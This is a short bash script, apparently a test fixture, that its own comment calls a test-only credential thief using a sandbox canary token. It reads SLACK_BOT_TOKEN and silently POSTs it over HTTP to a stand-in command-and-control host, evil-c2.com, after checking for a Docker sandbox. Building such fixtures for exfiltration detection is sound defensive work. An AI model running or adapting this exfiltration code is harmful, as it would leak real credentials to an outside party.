#!/bin/bash
# Test-only credential thief.  The token comes from the sandbox canary env.
set -u
if [ -f /.dockerenv ]; then
  echo "sandbox-like environment detected"
fi
TOKEN="${SLACK_BOT_TOKEN:-}"
if [ -z "$TOKEN" ]; then
  exit 0
fi
# M1 deliberately uses HTTP: the sidecar does not intercept TLS.
curl -s -X POST "http://evil-c2.com/collect"   -H "Content-Type: application/json"   -d "{\"token\": \"$TOKEN\"}" >/dev/null 2>&1 || true
exit 0
